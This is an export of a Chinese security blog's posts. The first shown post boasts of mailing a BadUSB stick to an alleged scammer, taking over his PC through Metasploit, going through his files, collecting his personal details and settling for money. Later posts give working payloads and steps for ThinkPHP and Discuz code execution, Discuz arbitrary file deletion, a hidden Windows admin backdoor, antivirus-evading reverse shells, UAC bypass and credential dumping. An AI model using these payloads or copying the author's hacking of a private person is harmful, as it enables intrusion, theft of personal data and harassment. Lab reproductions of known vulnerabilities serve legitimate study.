href="http://www.liuwx.cn/BadUSB.html">BadUSB-制作教程</a></p><p>具体演示效果可以看我B站发的视频：</p><p><a href="https://www.bilibili.com/video/av69355226">利用MSF反弹Win7和Win10的Shell</a></p><h2 id="目标主机已上线！"><a href="#目标主机已上线！" class="headerlink" title="目标主机已上线！"></a>目标主机已上线！</h2><p>过了两天半，那小子收到我的<code>U盘</code>了，不得不说，顺丰真的快!</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/470.jpg" alt="图片"></p><p>小子！这可是你亲手插到你电脑的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/464.png" alt="图片"></p><p>然后翻了一下他的<code>C盘</code>没有找到什么，来到<code>D盘</code>找到了这b的犯罪记录:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/465.png" alt="图片"></p><p>打开看了一下，有不少的信息！就不放出来了！</p><p>当我还在翻他的资料的时候，他好像怀疑我了</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/471.jpg" alt="图片"></p><p>接着我哄他说我那个邮箱密码登不上了，然后给他重新换一个填写他的邮箱；没想到他信了，</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/467.png" alt="图片"></p><p>估计是他太急吧，然后得到了他的邮箱：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">邮箱：2754****@qq.com</span><br><span class="line">他的qq：2754****</span><br></pre></td></tr></table></figure><p>还好你信了啊，不然我都不知道咋接话了…</p><p>继续!<code>msf</code>上传一个远控方便翻文件，dos下翻东西我不太习惯…</p><p>经过一些信息收集，查到了他的资料：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">张**</span><br><span class="line">某高校学生</span><br><span class="line">邮箱：2754****@qq.com</span><br><span class="line">他的qq：2754****</span><br><span class="line">手机号：155******12</span><br></pre></td></tr></table></figure><p>以及他的小电影…</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/468.png" alt="图片"></p><p>兄台！电影我替你收走了！</p><p>本来想进行一波内网渗透的，结果发现这小子局域网里只有他一台主机..</p><p>算了算了，就到这吧！</p><h2 id="末尾"><a href="#末尾" class="headerlink" title="末尾"></a>末尾</h2><p>这里插一句：<code>做人留一线，日后好想见！</code>每个人都有犯错的时候，给他一次机会也就是给自己一次机会，只要以后不做这个就好！</p><p>最后吧我找到的信息发给它，问你是不是<code>张**</code>然后直接跟他摊牌，这小子慌了；后来他跟我说，他是某高校的学生，还是<code>211</code>(无语…放着这么好的学校不好好上，搞个锤子的黑产)完事了解后，好在他没有吧这些东西放出去，最后我也是让他把那些资料全部删掉让他不要搞这玩意，最后妥协500块还给了他，然后他也同意我发这篇文章，这才让各位吃瓜群众看到这篇文章！</p><p>诶?我好像还亏了几十块和一个U盘?等等，小子!别走！吧邮费退给我啊！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> BadUSB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后门技巧 - Win10系统用户隐藏</title>
      <link href="/2019/10/15/RedTeaming-1/"/>
      <url>/2019/10/15/RedTeaming-1/</url>
      
        <content type="html"><![CDATA[<h2 id="新建隐藏用户"><a href="#新建隐藏用户" class="headerlink" title="新建隐藏用户"></a>新建隐藏用户</h2><blockquote><p>net user liuwx$ 123456 /add</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/457.png" alt="图片"></p><blockquote><p>net localgroup administrators liuwx$ /add</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/458.png" alt="图片"></p><p> 可以看到我们创建了一个隐藏用户：<code>liuwx</code></p><p> <img src="img/459.png" alt="图片"></p><p> 接着<code>net user</code>发现并没有显示<code>liuwx</code>这个用户！</p><h2 id="查看隐藏用户"><a href="#查看隐藏用户" class="headerlink" title="查看隐藏用户"></a>查看隐藏用户</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/460.png" alt="图片"></p><p><code>regedit</code>打开注册表</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/461.png" alt="图片"></p><p>可以看到，在<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下有我们所有的用户名(包括隐藏用户)！</p><p>但是刚开始打开<code>注册表</code>是查看不了的，就好比如下图：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/462.png" alt="图片"></p><p>可以看到，在<code>SAM</code>下没有列表了，原因是<code>权限</code>问题!</p><p><code>SAM</code> 右键 <code>权限</code> - 给 <code>administrator</code> 一个<code>完全控制</code>和<code>读取权限</code>! </p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/463.png" alt="图片"></p><p>如何打开<code>权限</code>没有<code>adminisrator</code>的话，就添加一个并设置权限就ok</p><p>权限设置完毕后，关闭注册表重新打开即可看到隐藏用户</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 后渗透 </tag>
            
            <tag> RedTeam </tag>
            
            <tag> 后门技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 2.x 任意代码执行漏洞复现</title>
      <link href="/2019/10/15/ThinkPHP-1/"/>
      <url>/2019/10/15/ThinkPHP-1/</url>
      
        <content type="html"><![CDATA[<p>##ThinkPHP 2.x 任意代码执行漏洞介绍</p><p>ThinkPHP <code>2.x</code> 版本中，使用<code>preg_replace</code>的<code>/e</code>模式匹配路由：</p><blockquote><p>$res = preg_replace(‘@(\w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2”;’, implode($depr,$paths));</p></blockquote><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>ThinkPHP <code>3.0</code> 版本因为<code>Lite</code>模式下没有修复该漏洞，也存在这个漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/455.png" alt="图片"></p><p>这是Tp的默认页面，然后我们在网站后面加上：</p><blockquote><p>index.php?s=/index/index/name/${@phpinfo()}</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/456.png" alt="图片"></p><p>成功执行<code>phpinfo</code>!</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> CVE </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行漏洞复现</title>
      <link href="/2019/10/15/Discuz-2/"/>
      <url>/2019/10/15/Discuz-2/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先来到一个已存在的帖子：</p><blockquote><p><a href="http://192.168.1.104:8080/viewthread.php?tid=13&amp;extra=page=1">http://192.168.1.104:8080/viewthread.php?tid=13&amp;extra=page%3D1</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/452.png" alt="图片"></p><p>打开<code>BurpSuite</code>抓包：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/453.png" alt="图片"></p><p>在Cookie中增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/454.png" alt="图片"></p><p>从上图可以看到，<code>phpinfo</code>已成功执行!</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> CVE </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz!X ≤3.4 任意文件删除漏洞复现</title>
      <link href="/2019/10/14/Discuz-1/"/>
      <url>/2019/10/14/Discuz-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Discuz-X-≤3-4-任意文件删除漏洞"><a href="#Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="Discuz!X ≤3.4 任意文件删除漏洞"></a>Discuz!X ≤3.4 任意文件删除漏洞</h2><p>Discuz!X社区软件，是一个采用PHP 和MySQL 等其他多种数据库构建的性能优异、功能全面、安全稳定的社区论坛平台。</p><p>2017年9月29日，Discuz!修复了一个安全问题2用于加强安全性，这个漏洞会导致前台用户可以导致任意删除文件漏洞。</p><p>2017年9月29日，知道创宇404 实验室开始应急，经过知道创宇404实验室分析确认，该漏洞于2014年6月被提交到Wooyun漏洞平台，Seebug漏洞平台收录了该漏洞3，漏洞编号ssvid-93588。该漏洞通过配置属性值，导致任意文件删除。</p><p>经过分析确认，原有的利用方式已经被修复，添加了对属性的formtype判断，但修复方式不完全导致可以绕过，通过模拟文件上传可以进入其他unlink条件，实现任意文件删除漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先访问我们的<code>robots.txt</code>:(验证是否存在)</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/447.png" alt="图片"></p><p>接着是注册了一个<code>liuwx</code>，然后来到个人设置页面找到自己的<code>formhash</code>:<code>133dd9cc</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/446.png" alt="图片"></p><p>请求这个页面保存然后抓包：</p><blockquote><p><a href="http://192.168.1.104/home.php?mod=spacecp&amp;ac=profile&amp;op=base">http://192.168.1.104/home.php?mod=spacecp&amp;ac=profile&amp;op=base</a></p></blockquote><p>来到这个参数：<code>birthprovince</code>,这个参数填写的是你要删除的文件，以<code>robots.txt</code>为例：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/449.png" alt="图片"></p><p>接着<code>Forward</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/448.png" alt="图片"></p><p>提交成功后，从上图可以看到<code>出生地</code>会显示<code>../../../robots.txt</code>,也就是说明它待会要凉了咯~</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://[这里填写网站域名]/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;profilesubmit=1&amp;formhash=[这里填写刚刚得到的hash]&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>把以上<code>POC</code>保存为<code>*.html</code>格式，然后打开上传任意一张图片：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/450.png" alt="图片"></p><p>这个时候用浏览器访问：</p><blockquote><p><a href="http://192.168.1.104/robots.txt">http://192.168.1.104/robots.txt</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/451.png" alt="图片"></p><p>可以看到，文件已经没咯~</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> CVE </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客从一台电脑迁移到其他电脑</title>
      <link href="/2019/10/13/hexo-1/"/>
      <url>/2019/10/13/hexo-1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两天在Win7上开虚拟机感觉有点小卡，索性今早8点起床装了个Win10，恰好我Win10还没怎么用过</p><p>但是想到了我之前用<code>Hexo</code>的博客要迁移，下面便是迁移的过程</p><h2 id="迁移过程"><a href="#迁移过程" class="headerlink" title="迁移过程"></a>迁移过程</h2><h3 id="安装必要软件"><a href="#安装必要软件" class="headerlink" title="安装必要软件"></a>安装必要软件</h3><p>一、安装<code>Git</code>客户端</p><p>二、安装<code>node.JS</code></p><h3 id="源文件拷贝"><a href="#源文件拷贝" class="headerlink" title="源文件拷贝"></a>源文件拷贝</h3><p>将你原来电脑上个人博客目录下必要文件拷到你的新电脑上（比如D:/web目录下），注意无需拷全部，只拷如下几个目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br><span class="line"> package.json</span><br><span class="line"> scaffolds/</span><br><span class="line"> source/</span><br><span class="line"> themes/</span><br><span class="line"> .ssh (这个文件在Administrator目录下)</span><br></pre></td></tr></table></figure><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><p>在<code>cmd</code>任意路径下输入下面指令安装<code>hexo</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h3 id="进入-D-web-目录（你拷贝到新电脑的目录），输入下面指令安装相关模块"><a href="#进入-D-web-目录（你拷贝到新电脑的目录），输入下面指令安装相关模块" class="headerlink" title="进入 D:/web 目录（你拷贝到新电脑的目录），输入下面指令安装相关模块"></a>进入 D:/web 目录（你拷贝到新电脑的目录），输入下面指令安装相关模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save  // 文章部署到 git 的模块</span><br><span class="line">（下面为选择安装）</span><br><span class="line">npm install hexo-generator-feed --save  // 建立 RSS 订阅</span><br><span class="line">npm install hexo-generator-sitemap --save // 建立站点地图</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote><p>这个时候就可以用hexo s来看到你的博客是否迁移成功</p></blockquote><h3 id="部署发布文章"><a href="#部署发布文章" class="headerlink" title="部署发布文章"></a>部署发布文章</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean   // 清除缓存 网页正常情况下可以忽略此条命令</span><br><span class="line">hexo g       // 生成静态网页</span><br><span class="line">hexo d       // 开始部署</span><br></pre></td></tr></table></figure><p>这个时候<code>hexo d</code>部署的时候就会出错，他让你创建一个<code>SSH Keys</code>:</p><p>我输入的是我<code>coding</code>的<code>邮箱</code>和<code>用户ID</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;邮箱&quot;</span><br><span class="line">git config --global user.name &quot;用户名&quot;</span><br></pre></td></tr></table></figure><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这样就可以成功更换电脑然后写文章了~</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit-Bypass-360</title>
      <link href="/2019/10/13/Bypass-1/"/>
      <url>/2019/10/13/Bypass-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26758474&auto=1&height=66"></iframe><h2 id="Github-HackTheWorld-Use"><a href="#Github-HackTheWorld-Use" class="headerlink" title="Github - HackTheWorld - Use"></a>Github - HackTheWorld - Use</h2><blockquote><p><a href="https://github.com/stormshadow07/HackTheWorld">https://github.com/stormshadow07/HackTheWorld</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/443.png" alt="图片"></p><p>set Payload ：设置生成的<code>Payload</code></p><p>set LHOST : Metasploit监听的服务器<code>IP</code></p><p>set LPORT : Metasploit监听的<code>端口</code></p><p>set Shellcode ：设置为<code>bypassing</code></p><p>设置完后，会在<code>/result/</code>目录下有一个<code>final_54321.exe</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">==================================== RESULT ====================================</span><br><span class="line"></span><br><span class="line">[+] Adding Manifest </span><br><span class="line">Microsoft (R) Manifest Tool</span><br><span class="line">Copyright (c) Microsoft Corporation. </span><br><span class="line">All rights reserved.</span><br><span class="line">0009:err:ole:CoGetClassObject class &#123;e5cb7a31-7512-11d2-89ce-0080c792e5d8&#125; not registered</span><br><span class="line">0009:err:ole:CoGetClassObject no class object &#123;e5cb7a31-7512-11d2-89ce-0080c792e5d8&#125; could be created for context 0x1</span><br><span class="line">[+] Final File with Manifest [./result/final_54321.exe] </span><br></pre></td></tr></table></figure><h2 id="绕过360反弹回话到Metasploit"><a href="#绕过360反弹回话到Metasploit" class="headerlink" title="绕过360反弹回话到Metasploit"></a>绕过360反弹回话到Metasploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用exploit监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">设置payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/444.png" alt="图片"></p><p>exploit:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/445.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: liuwx-PC\liuwx</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
          <category> Bypass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit之windows提权应用_UAC绕过</title>
      <link href="/2019/10/12/metasploit-9/"/>
      <url>/2019/10/12/metasploit-9/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=457219109&auto=1&height=66"></iframe><h2 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h2><blockquote><p>用户帐户控制（简称UAC）是微软公司在其Windows Vista，及更⾼版本操作系统中采用的一种控制机制。通过 本文你将了解它是如何保护你免受恶意软件侵害的，以及忽略UAC提示将可能给你系统带来的麻烦。</p></blockquote><h3 id="UAC实例"><a href="#UAC实例" class="headerlink" title="UAC实例"></a>UAC实例</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/432.png" alt="图片"></p><p>可以看到，我<code>sessions</code>有4个，我先进入到一个不是系统权限的session：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/433.png" alt="图片"></p><p><code>hashdunm</code>失败，这就是权限问题，我们没有用管理员权限运行！</p><p>我们来到肉鸡这里，右键以管理员权限运行就会弹出这个：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/434.png" alt="图片"></p><p>而这个就是<code>UAC</code>!</p><p>而如果我们用了<code>管理员权限</code>运行，这个时候就可以<code>hashdump</code>了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/435.png" alt="图片"></p><p>有的你运行一个软件它会弹出一个框框问你是否要运行：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/436.png" alt="图片"></p><p>如果你点击确认/是的话，那么你就过了<code>UAC</code>的权限！这个时候就可以进行一个真正的管理员权限的操作!</p><h3 id="UAC是如何运作的"><a href="#UAC是如何运作的" class="headerlink" title="UAC是如何运作的"></a>UAC是如何运作的</h3><p>一旦程序执⾏涉及<code>系统更改</code>/<code>特定任务</code>就会触发UAC。除非尝试执行他们的进程<code>以管理员权限运行</code>，否则这些操作都将被阻止。</p><p>没有管理员权限将无法执⾏以下操作：</p><ul><li>注册表修改（如果注册表项位于如HKEY_LOCAL_MACHINE下（因为它影响多个⽤户户），它将是只读的）</li><li>加载设备驱动程序</li><li>DLL注入</li><li>修改系统时间(clock)</li><li>修改⽤户帐户控制设置（通过注册表可以启用/禁用它，但你需要正确的权限才能执行该操作）</li><li>修改受保护的目录（例如Windows⽂件夹，Program Files）</li><li>计划任务（例如，以管理员权限自启动）</li></ul><h2 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass-UAC"></a>Bypass-UAC</h2><p>有的时候我们没有办法以管理员身份来运行我们的程序，只能以普通用户的权限来运行，这个时候怎么来绕过<code>UAC</code>来用管理员权限运行呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #   Name                                                   Disclosure Date  Rank       Check  Description</span><br><span class="line">   -   ----                                                   ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3   exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)</span><br><span class="line">   7   exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   8   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br><span class="line">   9   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)</span><br><span class="line">   10  exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我是先把<code>meterpreter</code>会话放到后台，然后使用这个模块：</p><blockquote><p>exploit/windows/local/bypassuac</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/437.png" alt="图片"></p><p>show options可以看到他需要设置一个<code>session</code>，然后run:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/438.png" alt="图片"></p><p>这边已经运行成功了！但是我的肉鸡是<code>x64</code>位的，而这个bypassuac是<code>x86</code>,所以不能成功执行<code>hashdump</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/439.png" alt="图片"></p><p>但是可以执行创建或者删除用户:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/442.png" alt="图片"></p><p>如果目标肉鸡是<code>x86</code>的话，就可以执行<code>hashdump</code>以及<code>net user</code>创建或者删除用户的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/440.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
            <tag> UAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit-后渗透Post的常用模块使用</title>
      <link href="/2019/10/12/metasploit-8/"/>
      <url>/2019/10/12/metasploit-8/</url>
      
        <content type="html"><![CDATA[<h2 id="后渗透操作"><a href="#后渗透操作" class="headerlink" title="后渗透操作"></a>后渗透操作</h2><blockquote><p>在获取到一枚Meterpreter的shell之后，就可以进行下一步的渗透，这就是传说中的后渗透了</p></blockquote><p>那msf中的<code>post</code>模块就是一个后渗透模块，里面包含各种后渗透中有可能用到的功能，最多的就是信息收集。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/427.png" alt="图片"></p><p>那么我这边就模拟一下拿到<code>cmdshell</code>后的操作：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/428.png" alt="图片"></p><p>可以看到，我这边<code>sessions</code>是有一个<code>meterpreter</code>会话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                Connection</span><br><span class="line">  --  ----  ----                     -----------                ----------</span><br><span class="line">  1         meterpreter x64/windows  liuwx-PC\liuwx @ LIUWX-PC  192.168.119.136:8888 -&gt; 192.168.119.139:49162 (192.168.119.139)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="在后渗透的时候，我们可以使用post模块辅助我们"><a href="#在后渗透的时候，我们可以使用post模块辅助我们" class="headerlink" title="在后渗透的时候，我们可以使用post模块辅助我们"></a>在后渗透的时候，我们可以使用post模块辅助我们</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post/multi/recon/local_exploit_suggester</span><br><span class="line">post/windows/gather/hashdump</span><br><span class="line">post/windows/gather/smart_hashdump</span><br><span class="line">post/multi/gather/firefox_creds</span><br><span class="line">post/multi/gather/ssh_credspost/windows/gather/enumapplicatio</span><br><span class="line">...等等</span><br></pre></td></tr></table></figure><h3 id="post-multi-recon-local-exploit-suggester"><a href="#post-multi-recon-local-exploit-suggester" class="headerlink" 